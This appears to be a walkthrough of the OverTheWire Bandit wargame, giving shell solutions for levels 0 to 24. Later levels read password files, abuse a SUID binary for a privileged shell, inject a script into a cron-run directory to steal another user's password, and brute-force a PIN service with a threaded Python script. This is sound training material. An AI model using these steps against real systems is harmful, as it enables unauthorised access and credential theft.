## Bandit Challenges
[Challenges](https://overthewire.org/wargames/bandit/) found on [overthewire.org](https://overthewire.org/wargames/)

### Solved Levels
- [Level 0](#level-0)
- [Level 1](#level-1)
- [Level 2](#level-2)
- [Level 3](#level-3)
- [Level 4](#level-4)
- [Level 5](#level-5)
- [Level 6](#level-6)
- [Level 7](#level-7)
- [Level 8](#level-8)
- [Level 9](#level-9)
- [Level 10](#level-10)
- [Level 11](#level-11)
- [Level 12](#level-12)
- [Level 13](#level-13)
- [Level 14](#level-14)
- [Level 15](#level-15)
- [Level 16](#level-16)
- [Level 17](#level-17)
- [Level 18](#level-18)
- [Level 19](#level-19)
- [Level 20](#level-20)
- [Level 21](#level-21)
- [Level 22](#level-22)
- [Level 23](#level-23)
- [Level 24](#level-24)

### Level 0
Start point of this challenges is `bandit0:bandit0@bandit.labs.overthewire.org:2220`.  
Let's connect to it with ssh...  
```bash
$ ssh bandit0@bandit.labs.overthewire.org -p 2220
```
  
After that we can to list the directory and see the file `readme`.  
This file contains password to the next level.

### Level 1
In this level we have strange file with the name `-`.  
To read them we can use these command.  
```bash
$ cat ./-
```
  
And we can see password to the next level.

### Level 2
Now we have the file with the spaces in the name.  
To read the password, use one of the next commands.  
```bash
$ cat spaces\ in\ this\ filename
$ cat "spaces in this filename"
$ cat 'spaces in this filename'
```

### Level 3
This level have the hidden file in the `inhere` directory.  
To find them use can use next command.  
```bash
$ ls -a inhere
```
To read...  
```bash
$ cat inhere/.hidden
```

### Level 4
In this challenge we have directory `inhere` again. But now it's contains more files.  
To find the one you want use this command.  
```bash
$ file inhere/*
```
After that you'll see that only one file has type `ASCII text`.  
Let's read them on move on.

### Level 5
To solve this level we need to use the `find` command.  
In the description you know file specifications.  
Use them to build the command that find the file.  
```bash
$ find inhere/ -type f -size 1033c ! -executable -exec file {} + | grep ASCII
```

### Level 6
Now we need to use `find` command again.  
And again we have the file's specifications in the challenge's description.  
Let's find these file.  
```bash
$ find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null
```

### Level 7
In this level we have the file with a lot of text.  
But we knows that the password stored after the `millionth` word.  
```bash
$ cat data.txt | grep millionth
```

### Level 8
This level have `data.txt` file too.  
We now that the needed line occurs only one.  
```bash
$ cat data.txt | sort | uniq -u
```

### Level 9
In this case we have some file looks like a some dump.  
Description says that needed string have a `=` character in the front.  
We can to read them all and print nicely.  
```bash
$ strings data.txt | grep === | cut -d ' ' -f 2 | tr '\n' ' '; echo
```
  
Output will have the password to the next level.

### Level 10
Again we have the `data.txt` file.  
But it contains only one string encoded with `base64`.  
Just decode it and go ahead.  
```bash
$ cat data.txt | base64 -d
```
  
### Level 11
On this level we have `data.txt` with only one string again.  
It is encoded by ROT13 algorithm.  
To decode we don't need any online tools.  
```bash
$ cat data.txt | tr A-Za-z N-ZA-Mn-za-M
```
### Level 12
Now we have a same file but it's contains the HEX dump.  
To resolve this challenge we can use `xxd` and few archivers.  
```bash
$ xxd -r data.txt | gzip -dk - | bzip2 -dk - | gzip -dk - | tar xOf - | tar xOf - | bzip2 -dk - | tar xOf - | gzip -dk - | cat
```

### Level 13
In this case we have a just SSH Private Key.  
Level's description says that is for `bandit14`.  
```bash
$ ssh bandit14@localhost -i sshkey.private -p 2220 'cat /etc/bandit_pass/bandit14'
```

### Level 14
Now we have the some server hosted on the `30000` port.  
From description we know that to retrieve the next password we need to send current password.  
```bash
$ cat /etc/bandit_pass/bandit14 | nc localhost 30000
```

### Level 15
This challenge looks like the previous, but now we need to use SSL.  
```bash
$ cat /etc/bandit_pass/bandit15 | openssl s_client -ign_eof localhost:30001
```

### Level 16
In this level before the connect we need to find the server.  
```bash
$ nmap localhost -vvvv -p31000-32000 -sC
```
  
In the output we can see that only one port have a SSL certificate and it's a `31790`.
```bash
$ cat /etc/bandit_pass/bandit16 | openssl s_client -ign_eof localhost:31790
```
Output will have the private RSA key for the `bandit17` user.

### Level 17
Now we have a two files `passwords.new` and `passwords.old`.  
Description says that we need to find the unique password.  
```bash
$ diff passwords.old passwords.new
```
  
Second password will be correct.

### Level 18
If you try to connect to the `bandit18` user with ssh you'll see that shell does not spawned.  
To find the file you want, you can list `bandit18`'s home directory and discover the `readme` file.
To solve this problem ssh can send one command when connect.  
```bash
$ ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
```
  
This file contains `bandit19`'s password.

### Level 19
It's a first level with the SUID binary.  
Looks like it's a renamed `env` utility.  
```bash
$ echo cat /etc/bandit_pass/bandit20 | ./bandit20-do /bin/bash -p
```

### Level 20
Now we have binary that connect to the any local port and trying recieve the password for `bandit20`.  
First of all let's start the NetCat listener on port `3450`, send the password and connect with `suconnect`.  
```bash
$ cat /etc/bandit_pass/bandit20 | nc -lvnp 3450& sleep 1; ./suconnect 3450
```

### Level 21
In this challenge we have a Cron.  
```bash
$ cat /etc/cron.d/cronjob_bandit22
```
  
We have a some `/usr/bin/cronjob_bandit22.sh` that runs every minute.  
```bash
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
  
The `/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv` file contains the password.

### Level 22
Again we have a Cron with the shell script at `/usr/bin/cronjob_bandit23.sh`
```bash
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```
  
To resolve this challenge use this command.  
```bash
$ cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
```
  
### Level 23
And again it's a Cron. Let's read the `/usr/bin/cronjob_bandit24.sh` file.  
```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

Looks like it's execute all scripts whitch owned by `bandit23` in directory `/var/spool/bandit24/foo`. After that it wait's 60 seconds and remove the script.  
To solve this challenge we need to create command that read `bandit24`'s password.  
```
$ echo "cat /etc/bandit_pass/bandit24 > /tmp/ChumkaPumba; chmod 777 /tmp/ChumkaPumba" > /var/spool/bandit24/foo/pumba.sh; chmod +x /var/spool/bandit24/foo/pumba.sh; sleep 60; cat /tmp/ChumkaPumba
```
  
Wait 60 seconds and you'll see `bandit24`'s password.

### Level 24
In this level we have a server with the pincode.  
Is no way to know pincode except by brute.  
Let's write python script to do that.  
```python
from threading import Thread
from threading import Lock
import socket
import os

PASS='PLACE THE PASSWORD'
lock = Lock ()
code = 0

def try_code ():
    global code
    global lock
    with socket.socket (socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect (('127.0.0.1', 30002))
        sock.recv (1024)
        while True:
            lock.acquire ()
            local_code = str (code).zfill (4)
            lock.release ()
            print ('\rNOW: ' + str (local_code), end='')
            sock.sendall (bytes (PASS + ' ' + local_code + chr (0x0A), encoding='ascii'))
            res = sock.recv (1024)
            if "Wrong" in str (res):
                pass
            else:
                print ('\nSUCCESS: ' + local_code)
                os._exit (0)
            lock.acquire ()
            code += 1
            lock.release ()

for i in range (15):
    Thread (target=try_code).start ()
```
  
Place your password and run. In output you'll see...  
```bash
NOW: 1041
SUCCESS:1025
```
  
And we can use the `SUCCESS` code to retrieve pincode.

